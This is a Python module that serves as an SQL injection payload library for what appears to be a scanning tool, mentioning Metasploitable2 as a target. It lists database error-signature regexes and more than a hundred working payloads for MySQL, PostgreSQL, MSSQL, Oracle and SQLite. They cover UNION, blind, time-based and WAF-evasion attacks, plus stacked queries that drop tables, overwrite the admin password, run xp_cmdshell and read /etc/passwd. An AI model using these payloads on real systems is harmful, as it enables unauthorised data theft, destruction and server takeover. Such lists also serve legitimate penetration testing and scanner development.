"""
SQLi payload library — P2 upgrade: 150+ payloads across all DB types.
"""

from typing import Dict, List

DB_ERROR_PATTERNS: Dict[str, List[str]] = {
    "mysql": [
        "SQL syntax.*MySQL",
        "Warning.*mysql_",
        "valid MySQL result",
        "MySqlException",
        "mysql_num_rows",
        "mysql_fetch",
        "check the manual that corresponds to your MySQL server",
        "Unknown column",
        "You have an error in your SQL syntax",
        "supplied argument is not a valid MySQL",
    ],
    "postgresql": [
        "PostgreSQL.*ERROR",
        "Warning.*pg_",
        "valid PostgreSQL result",
        "Npgsql.",
        "PG::SyntaxError",
        "org.postgresql.util.PSQLException",
    ],
    "mssql": [
        "Driver.* SQL[ -_]Server",
        "OLE DB.* SQL Server",
        "SqlException",
        "Unclosed quotation mark after the character string",
        "Microsoft OLE DB Provider for ODBC Drivers",
    ],
    "oracle": [
        "ORA-[0-9]{5}",
        "Oracle error",
        "Oracle.*Driver",
        "Warning.*oci_",
        "quoted string not properly terminated",
    ],
    "sqlite": [
        "SQLite/JDBCDriver",
        "SQLite.Exception",
        "System.Data.SQLite.SQLiteException",
        "sqlite3.OperationalError",
    ],
}

ERROR_BASED_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "'",
        '"',
        "1'",
        '1"',
        "\\",
        "')",
        '")',
        "');",
        '");',
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 'a'='a",
        "admin'--",
        "admin' #",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
        "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
        "' AND extractvalue(1,concat(0x7e,(SELECT user())))--",
        "' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
        "' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT @@version),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' ORDER BY 1--",
        "' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version,NULL--",
        "' UNION SELECT user(),database()--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "'; SELECT 1--",
        "'; DROP TABLE test--",
        "'/**/OR/**/1=1--",
        "'+OR+1=1--",
        "'%09OR%091=1--",
        "'%0AOR%0A1=1--",
        "' oR 1=1--",
        "'/**/UnIoN/**/SeLeCt/**/1,2,3--",
    ],
    "postgresql": [
        "'",
        '"',
        "1'",
        '1"',
        "' OR 1=1--",
        "' OR 'a'='a",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT version(),current_database()--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "'; SELECT pg_sleep(3)--",
        "'; COPY (SELECT '') TO '/tmp/test'--",
    ],
    "mssql": [
        "'",
        '"',
        "1'",
        '1"',
        "' OR 1=1--",
        "' OR 'a'='a",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT @@version,db_name()--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "'; WAITFOR DELAY '0:0:3'--",
        "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    ],
    "oracle": [
        "'",
        '"',
        "1'",
        '1"',
        "' OR 1=1--",
        "' UNION SELECT NULL FROM DUAL--",
        "' UNION SELECT NULL,NULL FROM DUAL--",
        "' UNION SELECT banner,NULL FROM v$version--",
        "' UNION SELECT table_name,NULL FROM all_tables--",
        "'; BEGIN dbms_lock.sleep(3); END;--",
    ],
    "sqlite": [
        "'",
        '"',
        "1'",
        '1"',
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT sqlite_version(),NULL--",
        "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
        "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--",
    ],
}

UNION_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version,user(),database()--",
        "') UNION SELECT 1,2,3--",
        "') UNION SELECT 1,2,3,4,5--",
    ],
}

BOOLEAN_BLIND_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' AND 1=1--",
        "' AND '1'='1",
        "') AND 1=1--",
        "' AND 2>1--",
        "' AND 'x'='x",
        "' AND 1=2--",
        "' AND '1'='2",
        "') AND 1=2--",
        "' AND 2<1--",
        "' AND 'x'='y",
        "' OR 1=1--",
        "' OR '1'='1",
        "' AND SUBSTRING(@@version,1,1)='5",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64",
        "' AND LENGTH(database())>0--",
    ],
    "postgresql": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'x'='x",
        "' AND 'x'='y",
        "' AND SUBSTRING(version(),1,1)='P",
    ],
}

TIME_BASED_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' AND SLEEP(3)--",
        "'; SELECT SLEEP(3)--",
        "' UNION SELECT SLEEP(3)--",
        "') AND SLEEP(3)--",
        '") AND SLEEP(3)--',
        "') AND SLEEP(3)#",
        "' AND SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5(1))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "'/**/AND/**/SLEEP(3)--",
        "'+AND+SLEEP(3)--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep(3)--",
        "'; SELECT pg_sleep(5)--",
        "'||pg_sleep(3)--",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:3'--",
        "'; WAITFOR DELAY '0:0:5'--",
    ],
    "oracle": [
        "'; BEGIN dbms_lock.sleep(3); END;--",
        "'; BEGIN dbms_lock.sleep(5); END;--",
    ],
    "sqlite": [
        "'; SELECT randomblob(100000000)--",
    ],
}

ORDER_BY_PAYLOADS: List[str] = [
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' ORDER BY 5--",
    "' ORDER BY 10--",
    "' ORDER BY 20--",
    "' ORDER BY 50--",
    "' ORDER BY 100--",
    "') ORDER BY 1--",
    "') ORDER BY 3--",
]

WAF_BYPASS_PAYLOADS: List[str] = [
    "'/**/OR/**/1=1--",
    "'/**/AND/**/1=1--",
    "'/**/UNION/**/SELECT/**/1,2,3--",
    "'+OR+1=1--",
    "'%09OR%091=1--",
    "'%0AOR%0A1=1--",
    "'%0DOR%0D1=1--",
    "'%0COR%0C1=1--",
    "'%A0OR%A01=1--",
    "' oR 1=1--",
    "' Or 1=1--",
    "' OR true--",
    "' || 1=1--",
    "' OR 1 LIKE 1--",
    "' OR 1 BETWEEN 1 AND 1--",
    "1%00' AND 1=1--",
    "%2527%20OR%201=1--",
    "' UN/**/ION SE/**/LECT 1,2,3--",
    "' OR 1=1 #",
    "' OR 1=1 %23",
    "' AND 1<>2--",
    "' AND 1!=2--",
]

# P6: Stacked query payloads for databases that support multi-statement execution
STACKED_QUERY_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "'; INSERT INTO users VALUES('hacker','pass')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; DROP TABLE users--",
        "'; SELECT * FROM users--",
        "'; CREATE TABLE pwned (id INT)--",
    ],
    "mssql": [
        "'; EXEC xp_cmdshell('whoami')--",
        "'; SELECT * FROM sys.tables--",
        "'; DROP TABLE users--",
        "'; EXEC sp_configure 'show advanced options',1--",
    ],
    "postgresql": [
        "'; SELECT pg_read_file('/etc/passwd')--",
        "'; CREATE TABLE pwned (id SERIAL)--",
        "'; COPY (SELECT '') TO '/tmp/pwned'--",
    ],
}

# P6: Additional boolean-blind paired payloads (numeric context, different quote styles)
BOOLEAN_BLIND_EXTENDED: List[List[str]] = [
    ["' AND 1=1--", "' AND 1=2--"],
    ['" AND 1=1--', '" AND 1=2--'],
    ["') AND 1=1--", "') AND 1=2--"],
    ['") AND 1=1--', '") AND 1=2--'],
    ["' AND '1'='1", "' AND '1'='2"],
    ['" AND "1"="1', '" AND "1"="2'],
    ["' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--"],
    ["' AND LENGTH('a')=1--", "' AND LENGTH('a')=2--"],
]

# P9: Numeric context payloads — no quotes, critical for Metasploitable2
NUMERIC_BOOLEAN_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        " AND 1=1--",
        " AND 1=2--",
        " AND 5>3--",
        " AND 5<3--",
        " AND 2>1--",
        " AND 2<1--",
        " OR 1=1--",
        " OR 1=2--",
        " AND 5=5--",
        " AND 5=6--",
    ],
}

NUMERIC_ERROR_PAYLOADS: List[str] = [
    "1",
    "-1",
    "1 AND 1=1",
    "1 AND 1=2",
    "1 OR 1=1",
    "0 OR 1=1",
    "1 UNION SELECT 1,2,3",
    "-1 UNION SELECT 1,2,3",
    "1'",
    '1"',
]

QUICK_PAYLOADS: List[str] = [
    "'",
    '"',
    "1'",
    '1"',
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' AND SLEEP(3)--",
    "' ORDER BY 1--",
    # P9: Numeric context quick payloads
    " AND 1=1",
    " AND 1=2",
    " OR 1=1",
    "-1 OR 1=1",
]

ALL_PAYLOADS: Dict[str, List[str]] = {
    "error": ERROR_BASED_PAYLOADS.get("mysql", []),
    "union": UNION_PAYLOADS.get("mysql", []),
    "boolean": BOOLEAN_BLIND_PAYLOADS.get("mysql", []),
    "time": TIME_BASED_PAYLOADS.get("mysql", []),
    "waf_bypass": WAF_BYPASS_PAYLOADS,
    "quick": QUICK_PAYLOADS,
    "stacked": STACKED_QUERY_PAYLOADS.get("mysql", []),
    "boolean_extended": BOOLEAN_BLIND_EXTENDED,
}


def get_error_payloads(db_type: str = "mysql", limit: int = 30) -> List[str]:
    return ERROR_BASED_PAYLOADS.get(db_type, ERROR_BASED_PAYLOADS["mysql"])[:limit]


def get_time_payloads(db_type: str = "mysql", limit: int = 8) -> List[str]:
    return TIME_BASED_PAYLOADS.get(db_type, TIME_BASED_PAYLOADS["mysql"])[:limit]


def get_stacked_payloads(db_type: str = "mysql", limit: int = 5) -> List[str]:
    return STACKED_QUERY_PAYLOADS.get(db_type, STACKED_QUERY_PAYLOADS["mysql"])[:limit]


def get_waf_bypass_payloads(limit: int = 20) -> List[str]:
    return WAF_BYPASS_PAYLOADS[:limit]
